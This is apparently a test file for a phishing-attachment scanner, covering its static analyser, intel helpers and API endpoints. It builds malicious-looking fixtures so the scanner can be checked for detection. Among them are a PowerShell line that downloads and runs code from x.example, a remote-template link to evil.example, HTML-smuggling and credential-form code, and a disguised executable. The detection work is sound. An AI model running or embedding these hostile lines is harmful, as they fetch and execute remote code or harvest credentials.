import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';

process.env.NODE_ENV = 'test';
process.env.STORAGE_FILE = path.join(os.tmpdir(), `phishshield-forensics-${process.pid}.json`);
process.env.CLIENT_DIST = path.join(os.tmpdir(), 'phishshield-no-client');
process.env.GEMINI_API_KEY = '';
process.env.VIRUSTOTAL_API_KEY = '';

const { analyzeAttachment, detectType } = await import('../src/engines/malware/staticAnalyzer.js');
const { registrableDomain, isPublicIp, ipInfo } = await import('../src/services/intel.service.js');
const { createApp } = await import('../src/app.js');

/** Minimal ZIP writer (stored entries) so tests build real archives in memory. */
function zip(files) {
  const locals = [], centrals = [];
  let offset = 0;
  for (const { name, data, encrypted = false } of files) {
    const n = Buffer.from(name), d = Buffer.from(data);
    const l = Buffer.alloc(30);
    l.writeUInt32LE(0x04034b50, 0); l.writeUInt16LE(20, 4); l.writeUInt16LE(encrypted ? 1 : 0, 6);
    l.writeUInt32LE(d.length, 18); l.writeUInt32LE(d.length, 22); l.writeUInt16LE(n.length, 26);
    const c = Buffer.alloc(46);
    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 6); c.writeUInt16LE(encrypted ? 1 : 0, 8);
    c.writeUInt32LE(d.length, 20); c.writeUInt32LE(d.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(offset, 42);
    locals.push(l, n, d);
    centrals.push(c, n);
    offset += 30 + n.length + d.length;
  }
  const cd = Buffer.concat(centrals), e = Buffer.alloc(22);
  e.writeUInt32LE(0x06054b50, 0); e.writeUInt16LE(files.length, 8); e.writeUInt16LE(files.length, 10);
  e.writeUInt32LE(cd.length, 12); e.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, e]);
}

function fakePe() {
  const b = Buffer.alloc(512);
  b.write('MZ', 0); b.writeUInt32LE(0x80, 0x3c); b.writeUInt32LE(0x00004550, 0x80); b.writeUInt16LE(0x10b, 0x80 + 24);
  b.write('This program cannot be run in DOS mode.', 0x40);
  b.write('VirtualAllocEx WriteProcessMemory CreateRemoteThread UPX0', 0x150);
  return b;
}

const titles = (r) => r.findings.map((f) => f.title);

test('detects a Windows executable disguised as a PDF', () => {
  const r = analyzeAttachment({ name: 'invoice.pdf', data: fakePe() });
  assert.equal(r.detectedType.id, 'pe');
  assert.equal(r.verdict, 'malicious');
  assert.ok(titles(r).includes('File type does not match its extension'));
  assert.ok(titles(r).includes('Suspicious Windows API imports'));
  assert.ok(titles(r).includes('Packed executable'));
  assert.match(r.sha256, /^[a-f0-9]{64}$/);
});

test('EICAR test signature is detected (built at runtime, never written to disk)', () => {
  const eicar = Buffer.from('WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=', 'base64');
  const r = analyzeAttachment({ name: 'readme.txt', data: eicar });
  assert.ok(titles(r).includes('Signature: EICAR antivirus test file'));
  assert.equal(r.verdict, 'malicious');
});

test('Word document with VBA macros and a remote template', () => {
  const docm = zip([
    { name: '[Content_Types].xml', data: '<Types/>' },
    { name: 'word/document.xml', data: '<w:document/>' },
    { name: 'word/vbaProject.bin', data: 'Attribute VB_Name' },
    { name: 'word/_rels/settings.xml.rels', data: '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>' },
  ]);
  const r = analyzeAttachment({ name: 'salary.docm', data: docm });
  assert.equal(r.detectedType.id, 'docx');
  assert.ok(titles(r).includes('Contains VBA macros'));
  assert.ok(titles(r).includes('Remote template injection'));
  assert.equal(r.verdict, 'malicious');
});

test('ZIP hiding a script and a password-protected archive', () => {
  const r = analyzeAttachment({ name: 'docs.zip', data: zip([{ name: 'scan_0012.pdf.js', data: 'WScript.Shell' }]) });
  assert.ok(titles(r).includes('Archive contains an executable or script'));
  assert.deepEqual(r.innerFiles, ['scan_0012.pdf.js']);
  const enc = analyzeAttachment({ name: 'secure.zip', data: zip([{ name: 'a.pdf', data: 'x', encrypted: true }]) });
  assert.ok(titles(enc).includes('Password-protected archive'));
});

test('PDF JavaScript on open, including inside a compressed object stream', () => {
  const plain = analyzeAttachment({ name: 'a.pdf', data: Buffer.from('%PDF-1.7\n1 0 obj <</OpenAction 2 0 R /JS (app.alert(1))>> endobj') });
  assert.ok(titles(plain).includes('JavaScript runs on open'));
  const hidden = zlib.deflateSync(Buffer.from('<</S /JavaScript /JS (this.exportDataObject())>> <</OpenAction 5 0 R>>'));
  const compressed = analyzeAttachment({ name: 'b.pdf', data: Buffer.concat([Buffer.from('%PDF-1.7\n4 0 obj <</Filter /FlateDecode>> stream\n'), hidden, Buffer.from('\nendstream endobj')]) });
  assert.ok(titles(compressed).includes('JavaScript runs on open'));
});

test('HTML attachment with a credential form and HTML smuggling', () => {
  const html = '<html><form action="https://collect.example/p.php"><input type="password" name="p"></form><script>var b=new Blob([atob(x)]);URL.createObjectURL(b);eval(y)</script></html>';
  const r = analyzeAttachment({ name: 'Secure_Message.html', data: Buffer.from(html) });
  for (const t of ['Credential-harvesting form', 'Form posts to an external server', 'HTML smuggling', 'Obfuscated JavaScript']) assert.ok(titles(r).includes(t), t);
  assert.equal(r.verdict, 'malicious');
});

test('filename tricks: right-to-left override and double extension', () => {
  assert.ok(titles(analyzeAttachment({ name: 'invoice‮fdp.exe', data: Buffer.from('x') })).includes('Right-to-left override in filename'));
  assert.ok(titles(analyzeAttachment({ name: 'report.pdf.exe', data: fakePe() })).includes('Double extension'));
});

test('PowerShell downloader script', () => {
  const r = analyzeAttachment({ name: 'update.ps1', data: Buffer.from("powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')\"") });
  assert.equal(r.verdict, 'malicious');
  assert.ok(r.urls.includes('http://x.example/a'));
});

test('ordinary files stay clean', () => {
  const txt = analyzeAttachment({ name: 'notes.txt', data: Buffer.from('Agenda for Monday: budget review, hiring plan, offsite dates.') });
  assert.equal(txt.verdict, 'clean');
  assert.equal(txt.findings.length, 0);
  const png = analyzeAttachment({ name: 'logo.png', data: Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(200)]) });
  assert.equal(png.verdict, 'clean');
  assert.equal(detectType(Buffer.from('%PDF-1.4 hello')), 'pdf');
});

test('intel helpers: registrable domain and public IPs (no network)', async () => {
  assert.equal(registrableDomain('login.secure.paypal.com'), 'paypal.com');
  assert.equal(registrableDomain('mail.bbc.co.uk'), 'bbc.co.uk');
  assert.equal(isPublicIp('192.168.1.4'), false);
  assert.equal(isPublicIp('8.8.8.8'), true);
  assert.equal(isPublicIp('203.0.113.77'), false);
  assert.equal((await ipInfo('10.0.0.1')).status, 'private');
});

/* ---------------- HTTP endpoints ---------------- */

let server, base;
before(async () => {
  server = createApp().listen(0);
  await new Promise((r) => server.once('listening', r));
  base = `http://127.0.0.1:${server.address().port}/api/v1`;
});
after(() => server.close());
const post = (p, body) => fetch(base + p, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });

test('POST /attachments/scan analyses base64 data; VirusTotal reports not configured', async () => {
  const res = await post('/attachments/scan', { name: 'invoice.pdf', data: fakePe().toString('base64') });
  assert.equal(res.status, 200);
  const r = await res.json();
  assert.equal(r.analysed, true);
  assert.equal(r.verdict, 'malicious');
  assert.equal(r.virustotal.status, 'not_configured');
});

test('POST /attachments/scan accepts a hash only, and validates input', async () => {
  const ok = await post('/attachments/scan', { name: 'big.iso', sha256: 'a'.repeat(64) });
  assert.equal((await ok.json()).analysed, false);
  assert.equal((await post('/attachments/scan', { name: 'x' })).status, 400);
});

test('a ~2.5 MB attachment fits the attachment body limit', async () => {
  const res = await post('/attachments/scan', { name: 'big.bin', data: Buffer.alloc(2.5 * 1024 * 1024, 7).toString('base64') });
  assert.equal(res.status, 200);
});

test('POST /assistant explains it is not configured (no fake answers)', async () => {
  const res = await post('/assistant', { evidence: { subject: 'x' }, question: 'Is this phishing?' });
  assert.equal(res.status, 503);
  assert.match((await res.json()).message, /not configured/i);
});

test('POST /intel handles private IPs without lookups; GET /capabilities', async () => {
  const r = await (await post('/intel', { ip: '192.168.0.10' })).json();
  assert.equal(r.ip.status, 'private');
  const caps = await (await fetch(`${base}/capabilities`)).json();
  assert.deepEqual([caps.assistant, caps.virustotal], [false, false]);
});
